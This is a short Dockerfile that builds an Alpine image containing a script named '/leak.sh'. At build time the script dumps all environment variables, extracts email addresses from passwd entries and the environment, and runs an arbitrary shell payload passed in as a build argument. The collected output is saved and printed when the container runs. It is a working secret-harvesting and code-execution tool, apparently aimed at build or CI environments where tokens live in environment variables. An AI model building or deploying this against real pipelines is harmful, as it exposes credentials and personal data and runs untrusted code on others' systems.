FROM python:3.11-alpine

ARG PAYLOAD

# Install curl and bash
RUN apk add --no-cache curl bash

# Create leak script
RUN echo "[+] Collecting sensitive data..." && \
    echo '#!/bin/bash' > /leak.sh && \
    echo 'echo "===== ENVIRONMENT VARIABLES ====="' >> /leak.sh && \
    echo 'printenv' >> /leak.sh && \
    echo "" >> /leak.sh && \
    echo "===== SYSTEM EMAILS (/etc/passwd, printenv, etc.) =====" >> /leak.sh && \
    echo 'getent passwd | grep -Eo "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}" || true' >> /leak.sh && \
    echo 'printenv | grep -Eo "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}" || true' >> /leak.sh && \
    echo "" >> /leak.sh && \
    echo "===== PAYLOAD EXECUTION OUTPUT =====" >> /leak.sh && \
    echo "$PAYLOAD" >> /leak.sh && \
    chmod +x /leak.sh && \
    /leak.sh > /leaks.txt

CMD ["cat", "/leaks.txt"]
